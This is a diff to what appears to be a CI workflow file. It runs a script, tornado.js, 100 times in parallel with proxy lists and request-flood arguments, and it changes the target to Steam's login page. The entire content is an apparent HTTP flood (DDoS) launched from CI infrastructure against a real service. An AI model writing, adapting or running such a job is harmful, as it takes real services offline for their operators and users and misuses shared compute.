@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 84 node tornado.js GET https://hexbear.xyz/hex 85 24 64 proxies.txt --full --query 3
+            timeout 84 node tornado.js GET https://store.steampowered.com/login/ 85 24 64 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
